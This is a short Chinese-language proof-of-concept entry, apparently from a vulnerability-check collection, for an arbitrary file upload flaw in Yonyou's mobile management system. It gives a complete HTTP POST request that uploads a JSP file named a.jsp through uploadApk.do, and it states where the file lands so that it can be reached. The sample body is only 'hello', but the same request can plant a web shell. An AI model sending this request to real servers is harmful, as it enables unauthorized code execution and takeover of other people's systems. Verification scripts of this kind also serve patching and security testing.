﻿# 用友 移动管理系统 uploadApk.do 任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：访问路径：/maupload/apk/a.jsp

> 漏洞特征：

> 验证脚本：HTTP

```
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server 

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition:form-data;name="downloadpath"; filename="a.jsp" 
Content-Type: application/msword

hello
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：/maupload/apk/a.jsp

> 验证文件来源：用友 移动管理系统 uploadApk.do 任意文件上传漏洞.poc
